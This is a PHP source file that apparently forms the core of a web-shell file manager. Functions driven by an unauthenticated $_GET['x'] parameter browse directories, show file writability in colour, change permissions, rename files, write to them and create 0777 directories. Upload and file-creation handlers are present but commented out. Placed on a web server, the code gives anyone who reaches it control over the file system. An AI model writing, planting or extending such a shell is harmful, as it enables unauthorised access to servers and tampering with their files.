<?php 

$modes = [
	"readonly" 	=> "r",
	"writeonly" => "w",
	"append"	=> "a"
];

function cwd() 
{
	if (isset($_GET['x'])) {
		$cwd = str_replace("\\", "/", $_GET['x']);
		@cd($cwd);
	} else {
		$cwd = str_replace("\\", "/", getcwd());
	} return $cwd;
}

function scDir()
{
	return scandir(cwd());
}

function htmlSafe($str)
{
	return htmlspecialchars($str);
}

function color($bold = 1, $colorid = null, $string = null) {
	$color = [
		"</font>",  			# 0 off
		"<font color='red'>",	# 1 red 
		"<font color='green'>",	# 2 lime
		"<font color='white'>",	# 3 white
		"<font color='gold'>",	# 4 gold
	];

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function cd($directory)
{
	return @chdir($directory);
}

function wr($filename, $perms)
{
	return (!is_writable($filename)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function getfTime($filename)
{
	return date("d/m/Y - H:i:s", filemtime($filename));
}

function perms($filename)
{
	$perms = fileperms($filename);

	switch ($perms & 0xF000) {
    	case 0xC000: // socket
        	$info = 's';
        	break;
    	case 0xA000: // symbolic link
        	$info = 'l';
        	break;
    	case 0x8000: // regular
        	$info = 'r';
        	break;
    	case 0x6000: // block special
        	$info = 'b';
        	break;
    	case 0x4000: // directory
        	$info = 'd';
        	break;
    	case 0x2000: // character special
        	$info = 'c';
        	break;
    	case 0x1000: // FIFO pipe
        	$info = 'p';
        	break;
    	default: // unknown
        	$info = 'u';
	}

	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

function listAllFiles($dir, &$result = array())
{
	foreach (scandir($dir) as $key => $value) {
		$pathname = $dir . DIRECTORY_SEPARATOR . $value;
		if (!is_dir($pathname)) {
			$result[] = $pathname;
		} elseif ($value != "." && $value != "..") {
			listAllFiles($pathname, $result);
			$result[] = $pathname;
		}
	} return $result;
}

function formatSize($bytes)
{
	$format = [
		"kb" => 1024,
		"mb" => 1048576,
		"gb" => 1073741824,
		"tb" => 1099511627776
	];

	switch ($bytes) {
		case ($bytes >= 0) && ($bytes < $format["kb"]):
			return $bytes . " B";
			break;
		case ($bytes >= $format["kb"]) && ($bytes < $format["mb"]):
			return ceil($bytes / $format["kb"]) . " KB";
			break;
		case ($bytes >= $format["mb"]) && ($bytes < $format["gb"]):
			return ceil($bytes / $format["mb"]) . " MB";
			break;
		case ($bytes >= $format["gb"]) && ($bytes < $format["tb"]):
			return ceil($bytes / $format["gb"]) . " GB";
			break;
		case ($bytes >= $format["tb"]):
			return ceil($bytes / $format["tb"]) . " TB";
			break;
		default:
			return $bytes . " B";
			break;
	}
}

function getSize($filename)
{
	return formatSize(filesize($filename));
}

function listFiles($type, $result = [])
{
	foreach (scDir() as $key => $value) {
		$listFiles = [
			"getPathname" 	=> cwd() . DIRECTORY_SEPARATOR . $value,
			"getName"		=> $value,
			"getSize"		=> getSize($value),
			"getPerm"		=> wr($value, perms($value)),
			"getTime"		=> getfTime($value)
		];

		switch ($type) {
			case 'dir':
				if (!is_dir($listFiles["getPathname"]) || $value === "." || $value === "..") continue 2;
				break;
			
			case 'file':
				if (!is_file($listFiles["getPathname"])) continue 2;
				break;
		}

		$result[] = $listFiles;
	} return $result; 
}

function getFileMode($filename)
{
	return substr(sprintf("%o", fileperms(htmlSafe($filename))), -4);
}

function changeMode($filename, $mode)
{
	return (!empty($filename)) ? chmod(htmlSafe($filename), $mode) : false;
}

function changeName($oldname, $newname)
{
	return (!empty($oldname)) ? rename($oldname, cwd() . DIRECTORY_SEPARATOR . $newname) : false;
}

function write($filename, $data, $mode)
{
	global $modes;

	if (!empty(trim($filename))) {
		$handle = fopen(htmlSafe($filename), $modes[$mode]);
		return (!empty($data)) ? fwrite($handle, $data) : false;
	}
}

function make($filename, $data = null, $type = null)
{
	$filename = htmlSafe($filename);
	switch ($type) {
		case 'makedir':
			return mkdir($filename, 0777);
		break;

		case 'makefile':
			return write($filename, $data, "append");
		break;
	}
}

function multipleUpload(&$files)
{
	$names = array( 'name' => 1, 'type' => 1, 'tmp_name' => 1, 'error' => 1, 'size' => 1);

    foreach ($files as $key => $part) {
        $key = (string) $key;
        if (isset($names[$key]) && is_array($part)) {
            foreach ($part as $position => $value) {
                $files[$position][$key] = $value;
            } unset($files[$key]);
        }
    }
}
// Upload
/*if (isset($_POST['submit'])) {
	multipleUpload($_FILES['files']);
	foreach ($_FILES['files'] as $key => $file) {
		var_dump($file);
		copy($file["tmp_name"], $_POST['dir'] . DIRECTORY_SEPARATOR . $file["name"])
	}
}
*/

// Make
/*if (isset($_POST['submit'])) {
	foreach ($_POST['file'] as $key => $value) {
		$xplode = explode(",", $_POST['file'][$key]);
		foreach ($xplode as $file) {
			var_dump(make($file, "santuy", "makefile"));
		}
	}
}*/
